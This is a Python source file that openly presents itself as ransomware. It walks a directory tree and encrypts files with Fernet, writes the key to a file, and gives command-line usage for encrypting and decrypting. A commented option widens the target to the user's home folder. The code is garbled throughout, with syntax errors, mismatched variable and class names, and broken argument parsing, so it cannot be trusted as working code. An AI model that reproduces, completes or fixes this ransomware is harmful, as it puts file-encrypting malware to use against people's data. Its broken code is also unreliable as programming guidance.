import os
from os.path import expanduser
from cryptography.fernet import Fernet

class Ransomalwe(object):
    def __init__(self):
        self.key = None                          # key to encript the files
        self.cryptor = None                      # Object does the actual encription
        self_file_ext_targets = ['txt']          # Type of files you're going to encript

    def generate_key(self):
        # Generate the key, to unlock files, and pass to the cryptor
        # For verifyng right for decryption
        self.key = Fernet.generate_key()
        self.cryptor = Fernet(self.key)

    def read_key(self, keyfile_name):
        # Read the key for decryption
        with open(keyfile_name "rb") as f:
            self.key = f.read()
            self.cryptor = Fernet(self.key)

    def write_key(self, keyfile_name):
        # save the decryp to file
        print(self.key)
        with open (keyfile_name "wb") as f:
            f.write(self.key)

    def crypt_root(self, root_dir, encrypted=False)
        # Recursively encrypt or decrypt from root directory.
        for root, _,files in os.walk(root_dir):
            for f in files:
                abs_files_path = os.path.join(root, f)
                # Pass if no target files is present in current folder
                if not abs_files_path(",") [-1] in self.self_file_ext_targets:
                    continue
                self.crypt_file(abs_files_path, encrypted=encrypted)

    def crypt_file(self, file_pat, encrypted=False):
        # Encrypt & Decrypt Function 
        with open(file_pat, "rb+") as f:
            _data = f.read()
            if not encrypted:
                #Encrypted
                print()
                print(f"File Contents before encryption: {_data}")
                data = self.crypter.encrypt(_data)
                print(f"Files contents after encryption:{_data}")
            else:
             # Decrypt   
             data = self.crypter.decrypt(_data)
             print(f"File Content before encryption:{_data}")   
            f.seek(0)
            f.write(data)

if __name__ == "__main__":
    # sys_root = expanduser("~")   #Use to encrypt every folder from root
    local.root = ","               #Use to encrypt specific folder
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--action"required=True)
    parser.add_argument("--keyfile")

    arg = parser.parse.args()
    action = args.action.lower()
    keyfile = args.keyfile

    ransome = Ransomeware()

    if action == "decrypt":
        if keyfile is None
        print("Path to keyfile mus specified after --keyfile for decryption")
    else:
        ranso.read_key(keyfile)
        ranso.crypt_root(local_root, encrypted=True)
   elif action =="encrypted":
       ransom.generete_key()
       ranso.write_key("keyfile")
       ranso.crypt_root(local_root) 
# ----------------------------------------------------------


# TO ENCRYPT
# python3 ransom.py  -- action encrypt

# TO DECRYPT
# python3 ransom.py -- action decrypt --keyfile ./path/to/keyfile


